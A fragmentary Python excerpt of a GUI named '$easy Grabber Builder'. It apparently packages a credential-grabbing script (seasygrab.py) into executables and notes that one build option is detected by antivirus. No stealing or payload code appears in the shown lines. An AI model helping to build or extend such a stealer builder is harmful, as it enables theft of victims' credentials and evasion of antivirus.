...
class App(ctk.CTk):
    def __init__(self):
        ...
        self.title(f"$easy Grabber Builder - Running on v{sys.version.split()[0]}")
        ...
        self.navigation_frame_label = ctk.CTkLabel(self.navigation_frame, text=" $easy Grabber Builder", image=self.logo_image,
...
Nuitka - Builds a standalone executable file with the necessary modules inside of it.\nAdvantages: Smaller than PyInstaller and way faster.\nDisadvantages: Detected by antiviruses, longer buildtimes.
    ...
    def get_config(self):
            ...
            try:
                with open(self.basefilepath + "\\seasygrab.py", 'r', encoding="utf-8") as f:
                    code = f.read()
